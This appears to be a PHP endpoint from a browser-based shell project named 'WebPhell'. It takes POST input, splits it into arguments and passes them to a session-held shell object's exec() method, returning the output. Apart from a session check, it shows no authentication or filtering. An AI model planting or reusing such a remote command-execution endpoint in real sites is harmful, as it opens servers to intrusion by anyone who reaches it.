<?php

define("PHELL", 1, true);

//Charge fichier de fonction
require 'functions.php';

//Verification de la presence du post
if(!testInput()){
    result(false);
}

//Recup la class phell
require '../phell.php';

//Recup session
session_name('WebPhell');
session_start();

//Verif presence du phell
if(!isset($_SESSION['phell'])){
    result(false);
}

//Execute la commande
$argv = explode(" ", $_POST['input']);
ob_start();
$res = $_SESSION['phell']->exec($argv);
$output = ob_get_contents();
ob_end_clean();
if($res){
    result(true, newLine($output));
} else {
    result(false);
}

